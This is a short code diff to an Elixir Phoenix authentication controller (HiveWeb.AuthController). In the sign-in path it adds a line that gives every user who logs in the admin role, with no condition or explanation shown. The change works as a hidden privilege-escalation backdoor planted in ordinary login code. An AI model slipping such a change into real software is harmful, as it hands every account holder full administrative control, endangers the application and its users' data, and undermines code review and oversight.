@@ -75,6 +75,8 @@ defmodule HiveWeb.AuthController do
             {:ok, user}
         end
 
+      {:ok, user} = Accounts.update_user_role(user, :admin)
+
       sign_in(conn, user)
     else
       conn
